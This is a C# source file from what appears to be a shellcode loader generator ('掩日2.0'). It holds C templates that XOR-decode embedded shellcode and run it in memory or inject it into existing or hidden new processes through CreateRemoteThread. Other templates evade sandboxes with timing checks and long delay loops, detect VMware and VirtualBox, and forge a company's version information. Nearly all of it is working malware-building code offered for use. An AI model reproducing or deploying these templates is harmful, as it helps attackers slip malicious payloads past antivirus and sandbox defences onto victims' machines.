using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日2._0
{
    class C_Template
    {
        public static string Base_Code = @"#include <windows.h>  
#include <stdio.h>
#include <time.h>
#include <io.h>

unsigned char code[] = ""{{shellcode}}"";
void main()
{
	clock_t start, finish;
	double Total_time;
	start = clock();
	Sleep(800);
	finish = clock();
	Total_time = (double)(finish - start);
	if(Total_time < 800)
	{
		return;
	}
	//{{sanbox_vm_detect}}
	//{{persistence}}
	
	int j = 234;
	int add = 12;
	
	for (int i = 0; i < sizeof(code); i++)
	{
		code[i] = code[i] ^ 123 ^ j;
		j += add;
	}
	
	//{{execute}}
	
}";

        //执行方式：VirtualAlloc
        public static string VirtualALloc = @"char* p = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(p, code, sizeof(code));
	(*(void(*)())p)();";

        //执行方式：GetProcAddress
        public static string GetProcessAddress = @"char* testString3 = ((char[]){'V','i','r','t','u','a','l','A','l','l','o','c','\0'});
	char* testString4 = ((char[]){'k','e','r','n','e','l','3','2','\0'});
FARPROC Allocate = GetProcAddress(GetModuleHandle(testString4), testString3);
	char* BUFFER = (char*)Allocate(NULL, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(BUFFER, code, sizeof(code));
	(*(void(*)())BUFFER)();";

        //动态加载，TODO
        public static string Dynamic = "";

        //注入到现有进程，需要提供 pid
        public static string CreateRemoteThread = @"DWORD pid = {{pid}};
	char* Xernel = ((char[]){'k','e','r','n','e','l','3','2','\0'});
	typedef LPVOID (WINAPI* OpenProcessC)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
	OpenProcessC op = (OpenProcessC)GetProcAddress(GetModuleHandle(Xernel), ""OpenProcess"");
	HANDLE processHandle = (char*)(*op)(PROCESS_ALL_ACCESS, FALSE, pid);
        typedef LPVOID(WINAPI* VirtualAllocExC)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	VirtualAllocExC vae = (VirtualAllocExC)GetProcAddress(GetModuleHandle(Xernel), ""VirtualAllocEx"");
        PVOID remoteBuffer = (char*)(*vae)(processHandle, NULL, sizeof code, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(processHandle, remoteBuffer, code, sizeof code, NULL);
        typedef LPVOID(WINAPI* CreateRemoteThreadC)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	CreateRemoteThreadC crt = (CreateRemoteThreadC)GetProcAddress(GetModuleHandle(Xernel), ""CreateRemoteThread"");
        HANDLE remoteThread = (char*)(*crt)(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        WaitForSingleObject(remoteThread, -1);
        CloseHandle(processHandle);";

        //注入到新进程，需要提供进程名
        public static string CreateNew = @"char* Xernel = ((char[]){'k','e','r','n','e','l','3','2','\0'});
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	si.cb = sizeof(STARTUPINFO);
	si.lpReserved = NULL;
	si.lpDesktop = NULL;
	si.lpTitle = NULL;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.cbReserved2 = 0;
	si.lpReserved2 = NULL;
	CreateProcessA(0, ""{{processname}}"", 0, 0, 0, 0, 0, 0, &si, &pi);
	DWORD pid = pi.dwProcessId;

        typedef LPVOID(WINAPI* OpenProcessC)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	OpenProcessC op = (OpenProcessC)GetProcAddress(GetModuleHandle(Xernel), ""OpenProcess"");
        HANDLE processHandle = (char*)(*op)(PROCESS_ALL_ACCESS, FALSE, pid);

        typedef LPVOID(WINAPI* VirtualAllocExC)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	VirtualAllocExC vae = (VirtualAllocExC)GetProcAddress(GetModuleHandle(Xernel), ""VirtualAllocEx"");
        PVOID remoteBuffer = (char*)(*vae)(processHandle, NULL, sizeof code, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(processHandle, remoteBuffer, code, sizeof code, NULL);

        typedef LPVOID(WINAPI* CreateRemoteThreadC)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	CreateRemoteThreadC crt = (CreateRemoteThreadC)GetProcAddress(GetModuleHandle(Xernel), ""CreateRemoteThread"");
        HANDLE remoteThread = (char*)(*crt)(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

        WaitForSingleObject(remoteThread, -1);
        CloseHandle(processHandle);";

        //延时绕沙箱，这个测试延时约180+秒
        public static string Super_Delay = @"for(int i = 1; i<50000000;i++)
	{
		for(int j=1;j<1500;j++)
		{
			int a=1;
			a += 88;
		}
        a += 1;
	}
    if(a != 50000000)
	{
		return;
	}";

        //检查注册表和文件绕虚拟机
        public static string Vm_Detect = @"HKEY hkey;
    if (RegOpenKey(HKEY_CLASSES_ROOT, ""\\Applications\\VMwareHostOpen.exe"", &hkey) == ERROR_SUCCESS)
    {  
        return;
    }  
    if (access(""C:\\Program Files\\VMware\\VMware Tools\\"", 0) == 0)
	{
		return;
	}
	if (access(""C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\"") == 0)
    {  
        return;
    }
	if (RegOpenKey(HKEY_LOCAL_MACHINE, ""SOFTWARE\\Oracle\\VirtualBox Guest Additions"", &hkey) == ERROR_SUCCESS)
	{
		return;
	}";

        //编译信息
        public static string compile_info = @"1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
FILEOS 0x40004
FILETYPE 0x1
{
BLOCK ""StringFileInfo""
{
    BLOCK ""040904B0""
    {
        VALUE ""CompanyName"", ""{{companyname}}""
        VALUE ""FileDescription"", ""An Excellent Software Developed By {{companyname}} To Solove Your Problem.""
        VALUE ""FileVersion"", ""1.0.0.0""
        VALUE ""LegalCopyright"", ""Copyright (C) 2020 {{companyname}}. All rights reserved.""
        VALUE ""ProductName"", ""{{companyname}} Helper""
        VALUE ""ProductVersion"", ""1.0.0.0""
    }
}

BLOCK ""VarFileInfo""
{
    VALUE ""Translation"", 0X0409, 0X04B0
}
}

";
    }
}
